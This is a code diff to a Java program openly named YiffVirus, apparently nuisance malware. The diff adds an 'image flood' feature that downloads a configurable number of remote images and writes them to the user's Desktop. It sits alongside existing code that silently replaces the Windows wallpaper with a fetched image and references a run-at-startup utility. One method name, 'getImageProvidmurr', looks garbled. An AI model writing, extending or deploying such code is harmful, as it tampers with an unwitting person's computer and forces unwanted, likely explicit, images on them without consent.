@@ -13,6 +13,8 @@ import java.awt.HeadlessException;
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
+import java.util.ArrayList;
+import java.util.List;
 
 public class YiffVirus extends JFrame implements Runnable {
 
@@ -86,15 +88,40 @@ public class YiffVirus extends JFrame implements Runnable {
         // Set image provider from config
         this.imageProviderService = config.getImageProvidmurr();
 
+        // Dirs used by multiple options
+        final File userHomeDir = new File(System.getProperty("user.home"));
+        final File userDesktopDir = new File(userHomeDir, "/Desktop");
+
         // Set background
         if (config.shouldChangeBackground()){
             File bg = new File(StartOnWindowsStartUtil.WINDOWS_APPDATA_ROAMING,
                     "/" + Long.toString(System.currentTimeMillis(), Character.MAX_RADIX) + ".png");
             try {
                 Files.write(bg.toPath(),
-                        imageProviderService.fetchBytes(imageProviderService.fetchImages(1).get(0)));
+                        imageProviderService.fetchBytes(getImageProviderService().fetchImages(1).get(0)));
                 WindowsUtils.changeBackground(bg.getAbsolutePath());
             } catch (IOException ignored) {}
+        }
+
+        // Image flood
+        if (config.shouldImageFlood()){
+            List<String> images = getImageProviderService().fetchImages(config.getImageAmount());
+            for (String url : images){
+                try {
+                    File imageFile = new File(userDesktopDir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
+                            "." + url.split("\\.")[url.split("\\.").length - 1]);
+                    if (config.shouldScatterAcrossDrive()){
+                        // TODO: Scatter across drive if enabled in the config
+                    }
+                    System.out.println(imageFile.getAbsolutePath());
+
+                    // Write the image to the file
+                    Files.write(imageFile.toPath(), getImageProviderService().fetchBytes(url));
+                } catch (Exception ignored) {
+                    ignored.printStackTrace();
+                }
+
+            }
         }
 
         // TODO: Set default user icon
